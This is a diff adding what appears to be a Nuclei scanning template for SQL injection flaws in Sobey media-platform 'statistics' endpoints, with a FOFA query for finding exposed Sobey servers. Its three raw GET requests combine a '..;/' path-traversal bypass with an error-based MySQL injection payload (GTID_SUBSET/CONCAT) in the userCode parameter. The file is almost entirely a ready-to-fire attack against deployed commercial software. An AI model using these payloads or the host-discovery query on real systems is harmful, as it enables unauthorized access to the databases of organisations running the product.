@@ -1,0 +1,45 @@
+id: poc-xt9vm9shso2fx9ya
+info:
+  name: 索贝融媒体statistics 存在多个SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xt9vm9shso2fx9ya'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xt9vm9shso2fx9ya
+    fofa: header="Sobey"||body="/Sc-TaskMonitoring/"
+http:
+- raw:
+  - 'GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1''+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+''1''=''1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztTWArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1''+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+''1''=''1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /sobey-mchEditor/js/..;/mch/Jzt/statistics/countJztMonthsDetailArticle?siteCode=&token=&userCode=admin&channelId=1&isRenYuan=1&userCode=1''+AND+GTID_SUBSET(CONCAT(0x7e,(SELECT+(ELT(1709=1709,1))),md5(1)),1709)and+''1''=''1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
